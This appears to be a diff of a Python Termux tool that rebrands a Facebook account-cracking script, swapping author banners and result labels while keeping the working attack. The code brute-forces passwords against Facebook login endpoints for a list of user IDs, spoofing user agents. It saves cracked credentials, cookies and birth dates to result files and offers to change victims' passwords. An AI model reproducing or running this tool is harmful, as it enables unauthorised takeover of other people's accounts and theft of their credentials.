@@ -1,12 +1,9 @@
-# Decoder By Nahid Afridy 👑
-# Decode file /- NA Cobra PYC 3.11
-# DECODE FILE VERSION - V.3.1.1
-# WHATSAPP - +8801923092304
-import os
-import time
-os.system("clear")
-print("  ==> \033[1;32mTHIS TOOLS DECODE BY (KING SUMON) ")
-time.sleep(5)
+# code by Yayan XD
+# my facebook ( https://www.facebook.com/KM39453 )
+
+#      (C) Copyright 407 Authentic Exploit
+#      Rebuild Copyright Can't make u real programmer:)
+#      Coded By Yayan XD.
 
 import os
 try:
@@ -40,7 +37,7 @@ try:
     nTemp = n - 1
 except ValueError:
     exit()
-os.system("clear")
+
 current = datetime.now()
 ta = current.year
 bu = current.month
@@ -48,6 +45,7 @@ ha = current.day
 op = bulan[nTemp]
 waktu = '%s %s %s'%(ha,op,ta)
 waktu.split('/')
+### WARNA RANDOM ###
 P = '\x1b[1;97m' # PUTIH
 M = '\x1b[1;91m' # MERAH
 H = '\x1b[1;92m' # HIJAU
@@ -68,6 +66,7 @@ BA = '\x1b[1;100m' # BELAKANG ABU ABU
 my_color = [
  P, M, H, K, B, U, O, N]
 warna = random.choice(my_color)
+############################ RESPONSE FACEBOOK ###########################################
 data,data2={},{}
 aman,cp,salah=0,0,0
 ubahP,pwBaru=[],[]
@@ -83,10 +82,18 @@ url_ip = "https://www.httpbin.org/ip"
 url_graph = "https://graph.facebook.com/{}"
 header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
+#agen1 = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile']
+#agen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']
+###########################################################################################
 hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"
 dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"
 aaaa, bbbb, cccc = "tools", "debug", "accesstoken"
+#bahasa = "en-GB,en-US;q=0.9,en;q=0.8"
 bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+#bahasa = "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"
+###########################################################################################
+## RANDOM UA
+#user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']
 uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
 uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
 uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
@@ -94,12 +101,15 @@ uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebK
 uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
 uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
 uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
+#uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
+#uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
 uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
 uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
 uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
 uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
 uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
 uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
+# lempankkkkkkkk
 ugen2=[]
 ugen=[]
 
@@ -151,6 +161,7 @@ def mentod():
     print(' %s[%s1%s] Method 1 free (%sRecommended%s)'%(N,H,N,H,N))
     print(' [%s2%s] Method 2 mbasic (%sRecommended%s)'%(H,N,H,N))
     print(' [%s3%s] Method 3 mobile (%sRecommended%s)'%(H,N,H,N))
+#-------- LOADING ANIMASI ------------
 def loading():
     animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
     for i in range(50):
@@ -158,29 +169,25 @@ def loading():
         sys.stdout.write(f"\r {N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
         sys.stdout.flush()
     print("")
+# LOGO
 def logo():
-    print("""\t╔══════════════════════════════════╗
-\t║\033[32;1mKG    KG \033[33;1mKING \033[37;1mKG    KG  \033[34;1mKINGKG    ║\033[33;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
-\t║\033[32;1mKG   KG   \033[33;1mKG  \033[37;1mKG#   KG \033[34;1mKG    KG   ║\033[32;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
-\t║\033[32;1mKG  KG    \033[33;1mKG  \033[37;1mKING  KG \033[34;1mKG         ║\033[33;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
-\t║\033[32;1mKING#     \033[33;1mKG  \033[37;1mKG KG KG \033[34;1mKG   KING  ║\033[34;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
-\t║\033[32;1mKG  KG    \033[33;1mKG  \033[37;1mKG  KING \033[34;1mKG    KG   ║\033[35;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
-\t║\033[32;1mKG   KG   \033[33;1mKG  \033[37;1mKG   KG# \033[34;1mKG    KG   ║\033[36;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
-\t║\033[32;1mKG    KG \033[33;1mKING \033[37;1mKG    KG  \033[34;1mKINGKG    ║\033[37;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
-\t╚══════════════════════════════════╝
-\033[1;39m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46m𝗞𝗜𝗡𝗚\033[1;39m━━━━━━━━━━━━━━━━━━━━┓
-\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\033[1;34m        : [★]𝗞𝗜𝗡𝗚 𝗦𝗨𝗠𝗢𝗡\033[1;39m         ┃
-\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m    : [★]𝗦𝗨𝗠𝗢𝗡 𝗞𝗛𝗔𝗡\033[1;39m         ┃
-\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\033[1;34m      : [★]𝗦𝗨𝗠𝗢𝗡-𝗧𝗘𝗥𝗠𝗨𝗫\033[1;39m       ┃
-\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\033[1;34m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\033[1;39m        ┃
-\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\033[1;34m    : [★]+𝟴𝟴𝟬𝟭𝟵𝟯𝟵𝟲𝟳𝟯𝟰𝟳𝟳\033[1;39m     ┃
-\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\033[1;34m  : [★]𝗥𝟰𝗡𝗗𝗢𝗡-𝗖𝗟𝗢𝗡𝗜𝗡𝗚\033[1;39m     ┃
-\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\033[1;34m: [★]𝗣𝗥𝗜𝗠𝗜𝗨𝗠\033[1;39m            ┃
- \033[1;39m    ┗━━━━━━━━━━━━━━━━━━━\033[1;31m𝙁𝙄𝙍𝙀\033[1;39m━━━━━━━━━━━━━━━━━━━━┛""")
-
+    print("""\n
+\033[1;92m    _          _
+\033[1;92m     \\        /
+\033[1;92m    __\\______/__
+\033[1;92m    | [\033[1;31;1m©\033[1;92m]  [\033[1;31;1m©\033[1;92m] |​
+ \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+]
+\033[1;92m╔══o00════════00o═════════════════════════╗
+\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m █
+\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m Black Gold          \033[1;31;1m █
+\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m █
+\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGorup Fb  :  \033[1;92m Termux Command World\033[1;31;1m █
+\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m█
+\033[1;92m╚═════════════════════════════════════════╝""")
+#CRACK SELESAI
 def hasil(ok,cp):
     if len(ok) != 0 or len(cp) != 0:
-        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By JIBON Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
+        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By James Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
         print(f' %s[%s+%s] Number of Accounts OK : %s%s%s'%(H,H,H,H,str(len(ok)),H))
         print(f' [%s+%s] Number of Accounts CP : %s%s%s'%(H,H,H,str(len(cp)),H))
         cek_cp = input(f"{H}══════════════════════════════════════════\n [{H}+{H}] Show CP detector options [{H}Y{N}/{M}t{N}]: ")
@@ -191,7 +198,7 @@ def hasil(ok,cp):
             ww=input(f"\n {N}[{K}?{N}] Change password when {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: ")
             if ww in ("Y","y","ya"):
                 ubahP.append("y")
-                print(f" {N}[{H}•{N}] Password example : {H}JIBON123{N}")
+                print(f" {N}[{H}•{N}] Password example : {H}james123{N}")
                 pwBar=input(f" {N}[{K}?{N}] Enter new password : {H}")
                 #print("\n")
                 if len(pwBar) <= 5:
@@ -202,9 +209,9 @@ def hasil(ok,cp):
                 kontol = memek.replace('\n', '')
                 titid  = kontol.split(' • ')
                 print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
-                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[KING-CP] ", "")}{N}')
+                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[JAMES-CP] ", "")}{N}')
                 try:
-                    log_hasil(titid[0].replace("[JIBON-CP] ", ""), titid[1])
+                    log_hasil(titid[0].replace("[JAMES-CP] ", ""), titid[1])
                 except requests.exceptions.ConnectionError:
                     continue
                     print("")
@@ -246,17 +253,20 @@ def cek_apk(session,coki):
         else:
             print(f'\r')
             #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))
+#METODE LOGIN
+### MENU UTAMA ###
 def file():
             logo()
             print('')
             print("\033[1;92m [01] File Clone ")
             key = input("\n [+] Select One : ")
             if key in [""]:
-                print(" [!]    ")
+                print(" [!] please select correct option")
                 exit()
             elif key in ["1", "01"]:
                 __chigoue__().chi(id)
 
+# MULAI CRACK
 class __chigoue__:
     def __init__(self):
         self.id = []
@@ -273,20 +283,23 @@ class __chigoue__:
         else:
             #jalan(f" {N}[{M}×{N}] Sorry, wrong username");self.tampilkan_apk()
             print(f" {H}[{H}×{H}] Select Between y/t");__chigoue__().chi(id)
-        self.cnt = input('\033[1;92m[+]    :\033[1;92m ')
+        self.cnt = input('\033[1;92m[+] Enter File Name :\033[1;92m ')
         self.id = open(self.cnt).read().splitlines()
         os.system('clear')
         ___two___ = ('y')
         if ___two___ in ('yes', 'Yes', 'Y', 'y'):
+#            self.__ok__()
             self.__pler__()
         else:
             print(' [!] Choose Correct One')
             self.chi(id)
 
+# METODE SANDI MANUAL
             #print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.plerr(id)
+# PROSES CRACK METODE 3 in 1
     def __metode__(self, cebok, user, pasw):
         global ok,cp,loop
-        animasi = random.choice(["\x1b[1;92m[KING]","\x1b[1;92m[KING]","\x1b[1;92m[KING]","\x1b[1;92m[KING]","\x1b[1;92m[KING]","\x1b[1;92m[KING]","\x1b[1;92m[KING]"])
+        animasi = random.choice(["\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]"])
         sys.stdout.write(f"\r {N}{animasi} {N}{loop}{N}/{M}{len(self.id)} {N}[{H}OK:{len(ok)}{N}][{K}CP:{len(cp)}{N}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
         sys.stdout.flush()
         try:
@@ -315,7 +328,7 @@ class __chigoue__:
                     elif "y" in Apk:
                         print(f'\r %sOK %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                         print(f'\r {H}Cookie   : {coki}')
-                    wrt = '[OK] %s • %s' % (user,pw)
+                    wrt = '[JAMES-OK] %s • %s' % (user,pw)
                     ok.append(wrt)
                     cek_apk(session,coki)
                     open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -327,7 +340,7 @@ class __chigoue__:
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
                         print('\r %sCP %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
-                        wrt = '[CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
+                        wrt = '[JAMES-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                         cp.append(wrt)
                         open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                         break
@@ -337,7 +350,7 @@ class __chigoue__:
                         year  = ''
                     except:pass
                     print('\r %sCP %s               \n Username : %s\n Password : %s%s\n'%(K,waktu,user,pw,N))
-                    wrt = '[CP] %s • %s' % (user,pw)
+                    wrt = '[JAMES-CP] %s • %s' % (user,pw)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -414,7 +427,7 @@ class __chigoue__:
             print('%s════════════════════════════════════════\n%sMANUAL PASSWORD MENU%s'%(H,H,H))
             #print(" %s[%s!%s] Semakin banyak kombinasi password semakin lama proses crack!"%(N,M,N))
             print("%s[%s!%s] Use %sComa%s For Choice Password"%(H,H,H,H,H))
-            print("%s[%s!%s] Example : %s786786,bangladesh,123456%s"%(H,H,H,H,H))
+            print("%s[%s!%s] Example : %s786786,pakistan,123456%s"%(H,H,H,H,H))
             pw = input(f"{H}[{H}+{H}] Enter Choice Password : {H}").split(",")
             print('%s════════════════════════════════════════\n[%s+%s] OK : results/OK-%s-%s-%s.txt'%(H,H,H,ha, op, ta))
             print('%s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(H,H,H,ha, op, ta))
@@ -438,4 +451,3 @@ class __chigoue__:
 
 if __name__ == '__main__':
     file()
-
